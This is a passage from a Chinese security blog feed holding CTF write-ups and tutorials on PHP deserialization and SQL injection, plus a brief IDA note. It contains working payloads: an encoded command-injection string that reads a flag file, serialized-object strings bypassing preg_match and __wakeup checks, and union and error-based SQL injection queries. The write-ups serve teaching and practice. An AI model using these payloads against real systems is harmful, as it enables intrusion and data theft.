lazyload><br>再执行php脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>&#125;<br>  <br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(printf$&#123;IFS&#125;&quot;\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160&quot;)&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到payload并且post提交<br>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319<br>得到最终flag<br><img src="/img/unsping4.png" srcset="/img/loading.gif" lazyload></p><h1 id="Web-php-unserialize攻防世界"><a href="#Web-php-unserialize攻防世界" class="headerlink" title="Web_php_unserialize攻防世界"></a><strong>Web_php_unserialize攻防世界</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//反序列化后执行</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <span class="hljs-comment">//GET获取值</span><br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <span class="hljs-comment">//base64解码</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <span class="hljs-comment">//preg_match匹配字符</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="preg-match-正则匹配绕过"><a href="#preg-match-正则匹配绕过" class="headerlink" title="preg_match()正则匹配绕过"></a>preg_match()正则匹配绕过</h3><p>&#x2F;[oc]:\d+:&#x2F;i研究：</p><ul><li><p><code>/</code>：用于界定正则表达式模式的分隔符。</p></li><li><p><code>[oc]</code>：字符类，匹配字符’o’或’c’。</p></li><li><p><code>:</code>：匹配一个冒号字符。</p></li><li><p><code>\d+</code>：匹配一个或多个数字。</p></li><li><p><code>:</code>：匹配一个冒号字符。</p></li><li><p><code>/i</code>：标志，使模式匹配时不区分大小写。</p><p>总结起来，这个正则表达式将匹配满足以下模式的字符串：</p></li><li><p>以字母’o’或’c’开头，后跟一个冒号。</p></li><li><p>然后是一个或多个数字。</p></li><li><p>最后是一个冒号。</p></li></ul><p>在PHP中，<code>preg_match()</code>函数用于对给定的字符串进行正则表达式匹配。如果匹配成功，该函数将返回1，否则返回0。</p><p><strong>类序列化后的值O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</strong><br>我们需要进行构造在4前面加上一个+即可，这样也可以表示数字4<br><strong>O:+4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</strong></p><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p>将变量数量由1改为2即可<br><strong>O:+4:”Demo”:2:{s:10:”Demofile”;s:8:”fl4g.php”;}</strong></p><h3 id="修改payload"><a href="#修改payload" class="headerlink" title="修改payload"></a>修改payload</h3><p>修改payload有两种方式<br>1.直接修改（不推荐，总是容易出现错误）<br>O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}<br>修改后O:+4:”Demo”:2:{s:10:”%00Demo%00file”;s:8:”fl4g.php”;}</p><p>2.利用函数修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>,<span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/Web_php_unserialize1.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="/2023/05/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/05/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h4 id="什么是反序列化漏洞"><a href="#什么是反序列化漏洞" class="headerlink" title="什么是反序列化漏洞"></a><strong>什么是反序列化漏洞</strong></h4><p>反序列化又叫对象注入，序列化在内部没有漏洞，漏洞产生是应该程序在处理对象、魔术函数以及序列化相关的问题导致的 当传给 unserialize()的参数可控时，那么用户就可以注入 payload,进行反序列化的时候就可能触发对象中的一些魔术方法。</p><p><strong>序列化与反序列化</strong></p><p>序列化 serialize<br>对象的状态信息转换为可以存储或传输的形式的过程 在序列化期间，对象将当前的状态写入到临时或持久性的存储区，将状态信息保存为字符串。</p><p>反序列化unserialize<br>将序列化后的字符串还原成对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;pikachu&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>&#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">S</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-comment">//输出的结果 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>O：代表object<br>1：代表对象名长度为一个字符<br>S：对象的名称<br>1：对象里面有一个变量<br>s：数据类型<br>4：变量名长度<br>test：变量名称<br>s：数据类型<br>7：变量值的长度<br>pikachu：变量值</p><h4 id="序列化中变量的属性"><a href="#序列化中变量的属性" class="headerlink" title="序列化中变量的属性"></a><strong>序列化中变量的属性</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$public</span> = <span class="hljs-string">&quot;public&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$private</span>=<span class="hljs-string">&quot;private&quot;</span>;<br>Protected <span class="hljs-variable">$Protected</span>=<span class="hljs-string">&quot;Protected&quot;</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure><p>在这里我们加入了public、private、protected三种变量属性序列化后的结果如下<br><img src="/img/%E5%BA%8F%E5%88%97%E5%8C%961.png" srcset="/img/loading.gif" lazyload><br>看这里我们可以发现变量名private和protected对不上，这是因为为了区分不同的属性，private和protected前面加上了空格标识符具体如下图<br><img src="/img/%E5%BA%8F%E5%88%97%E5%8C%962.png" srcset="/img/loading.gif" lazyload><br>按我的理解来说var定义变量类似于public</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h4><p>反序列化的数据本质上来说是没有危害的，用户可控数据进行反序列化是存在危害的，反序列化的危害，关键还是在于可控或不可控。</p><p><strong>序列化代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span>;s<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>&#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">S</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure><p>序列化后的结果O:1:”S”:1:{s:4:”test”;s:26:”&lt; script&gt;alert(1);&lt; &#x2F;script&gt;”;}</p><p><strong>反序列化代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;pikachu&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>&#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">S</span>();<br><span class="hljs-variable">$u</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$u</span>-&gt;test;<br></code></pre></td></tr></table></figure><p>在这里我们可以使用GET传参控制输出<br><img src="/img/%E5%BA%8F%E5%88%97%E5%8C%963.png" srcset="/img/loading.gif" lazyload></p><h4 id="反序列化里的魔法函数及其使用实例"><a href="#反序列化里的魔法函数及其使用实例" class="headerlink" title="反序列化里的魔法函数及其使用实例"></a><strong>反序列化里的魔法函数及其使用实例</strong></h4><p>construct() 当一个对象创建时被调用<br>destruct() 当一个对象销毁前被调用<br>sleep() 在对象被序列化前被调用<br>wakeup 将在反序列化之后立即被调用<br>toString 当一个对象被当做字符串使用时被调用<br>get(),set() 当调用或设置一个类及其父类方法中未定义的属性时<br>__invoke() 调用函数的方式调用一个对象时的回应方法<br>call 和 callStatic 前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SoFun</span> </span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<span class="hljs-comment">//保护型变量</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;file)) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strchr</span>(<span class="hljs-variable">$this</span>-&gt; file,<span class="hljs-string">&quot;\\&quot;</span>)===<span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strchr</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">false</span>)<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">dirname</span> (<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$this</span> -&gt;file);<span class="hljs-comment">//显示整个文件源码</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Wrong filename.&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt; file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<span class="hljs-comment">//这是一次过滤，使得只能读index.php，但是我们可以进行绕过</span><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span> ;<br>&#125;<br>    <br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<span class="hljs-comment">//如果无输入则直接显示index.php源码</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">base64_decode</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<span class="hljs-comment">//将GET型收到的内容进行base64解码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$file</span> );<span class="hljs-comment">//进行反序列化</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>所以我们分析后可以构造payload<br><strong>O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}</strong><br>1、将变量的个数改为2大于实际变量个数1，可以绕过__wakeup函数<br>2、使用\00*\00表示protected的属性同时，S 大写的是表示 Protected 的属性的字符串（或者直接输入%00）<br>4、值的内容改成flag.php可以读取该文件的源码</p><p>再将该payload进行一次编码得到Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ&#x3D;&#x3D;</p><h4 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a><strong>__wakeup绕过</strong></h4><p>利用版本:<br>PHP5&lt;5.6.25、PHP7&lt;7.0.10<br>原理：<br>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行<br>如上文中的O:5:”SoFun”:<strong>1</strong>:{S:7:”\00<em>\00file”;s:8:”flag.php”;}改成<br>O:5:”SoFun”:<strong>2</strong>:{S:7:”\00</em>\00file”;s:8:”flag.php”;}****</p><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h4><p>和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以好的预防措施就是不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>常见web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2023/05/13/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/05/13/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a><strong>SQL注入漏洞</strong></h2><p>Web 程序代码中对于用户提交的参数未做过滤就直接放到 SQL 语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p><h3 id="SQL注入常用编号"><a href="#SQL注入常用编号" class="headerlink" title="SQL注入常用编号"></a>SQL注入常用编号</h3><p>#单行注释 url编码%23<br>–空格 单行注释<br>空格url编码   %20<br>单引号url编码  %27</p><h3 id="SQL注入最基本的操作流程"><a href="#SQL注入最基本的操作流程" class="headerlink" title="SQL注入最基本的操作流程"></a>SQL注入最基本的操作流程</h3><p>假如是数字型注入<br>id&#x3D;1 and 1&#x3D;1 （正常）<br>id&#x3D;1 and 1&#x3D;2 （错误）<br>id&#x3D;1 or 1&#x3D;1（正常）<br>假如是字符型注入<br>id&#x3D;’1’ and 1&#x3D;1 #这里需要注释后面的单引号(正常回显)<br>再输入<br>id&#x3D;’1’ and 1&#x3D;2 #（无回显）</p><p>存在sql注入判断字符段数 order by<br>使用union select查询信息 union select  1 ,2<br>version()（当前版本信息）<br>user()（当前用户）<br>database()（当前数据库）</p><p>查询表 select table_name from information_schema.tables<br>这里简单说明一下information_schema数据库是自带的，保存着所有其他数据库的表，而information_schema.tables包含着所有的表<br>现在我们也好理解下面这句话了<br>select table_name from information_schema.tables where table_schema&#x3D;(select database())<br>这句话查询的是当前数据库所有的表<br>接下来查询字段了<br>select column_name from information_schema.columns where table_name&#x3D;’表名’<br><strong>(用编码就不用单引号，用单引号就不用编码）</strong><br>查字段的内容<br>select concat(id,username,password) from  表名</p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>联合注入就是使用union例如 1’ union select 1,2#<br>这里我们要先判断字段数，联合注入需要我们判断前后查询的内容个数一致<br><img src="/img/sql1.png" srcset="/img/loading.gif" lazyload><br>前半段查询1，5，一共两个数，所以后面为了和前面对其，也必须是两个数字。<br>我通过order by判断字段数为2所以查询语句如下<br>1’union select 1,(group_concat(user(),0x3a,database(),0x3a,version())) #<br>在这里0x3a表示字符    ： 在musql里会自动转成符号</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息。程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，定位文件错误。特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。<br><strong>在 php 中 使用 mysql_error()函数。如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。</strong></p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>updatexml(XML_document,XPath_string,new_value);</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>XML_document</td><td>String格式，为XML文档对象的名称，文中为Doc</td></tr><tr><td>XPath_string</td><td>Xpath格式的字符串</td></tr><tr><td>new_value</td><td>String格式，替换查到的符合条件的数据</td></tr></tbody></table><p>先简单说一下，我们主要修改第二个值，也就是XPath_string,会爆出查询信息<br>例如：(updatexml(1,user(),1)</p><p><strong>该函数有一个缺点，回显值最多为32位</strong></p><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>这个函数要求有点多，floor,rand,group by,count 缺一不可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from   information_schema.tables group by x)a);<br></code></pre></td></tr></table></figure><p>floor()：作用是把随机生成的随机数的小数去掉;<br>rand()：作用本身生成随机数，但是如果我们给他一个种子，那么他生成的随机数就是固定的，也称作伪随机数。故我们给他一个0作为随机数并且将其乘以二，用上floor()即可得到0 1 1(这里注意后面一直都是011循环)，而0 1 1就是我们所需要的三个数字。<br>group by ：group的工作原理是创建一个新表有两列，一列是键名一列是计数，如果有两个键名相同的数字，那么只会有一个键名但是计数为二，现在我们的随机数是011。<br>1、查询第一个值并进行运算得0<br>2、查询后开始插入，但这个时候会进行二次计算，所以实际插入的值是1<br>3、始新一轮查询，查询并运算的结果是1，这里直接进行加一<br>4、又开始新一轮查询，查询并运算的的结果是0，这里我们还没有插入过0，于是下一轮插入<br>5、我们插入的时候进行运算，此时的结果是1，所以我们会发现这里出错了。（前面我们已经插入过1，后面只需要进行计数即可，再次插入一就会报错）</p><h3 id="substr截取字符串"><a href="#substr截取字符串" class="headerlink" title="substr截取字符串"></a>substr截取字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, substr((SELECT flag <span class="hljs-keyword">from</span> flag),<span class="hljs-number">30</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA简单使用方法</title>
    <link href="/2023/04/22/IDA%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2023/04/22/IDA%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>IDA帮助进行逆向分析的工具，接下来介绍一下简单的使用方法<br>shift+F12    可以打开string窗口，一键找出所有字符串<br>F5                反编译成C语言</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权</title>
    <link href="/2023/04/14/%E6%8F%90%E6%9D%83/"/>
    <url>/2023/04/14/%E6%8F%90%E6%9D%83/</url>
    
